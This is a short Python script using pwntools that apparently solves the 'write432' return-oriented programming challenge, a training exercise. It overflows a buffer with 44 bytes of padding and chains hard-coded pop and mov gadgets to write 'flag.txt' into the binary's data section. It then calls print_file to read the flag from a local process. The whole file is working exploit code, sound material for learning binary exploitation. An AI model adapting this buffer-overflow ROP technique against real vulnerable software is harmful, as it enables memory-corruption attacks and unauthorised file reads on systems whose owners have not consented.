from pwn import *
data_section = 0x0804a018
pop = 0x080485aa
mov = 0x08048543
print_file = 0x80483d0

payload = flat(
    asm('nop') *44,
    
    pop,
    data_section,
    'flag',
    mov,
    
    pop,
    data_section+0x4,
    '.txt',
    mov,

    print_file,
    0x0,
    data_section
)

io=process(['./write432'])

io.sendlineafter('>',payload)
io.recvuntil('Thank you!\n')
flag= io.recv()
success(flag)
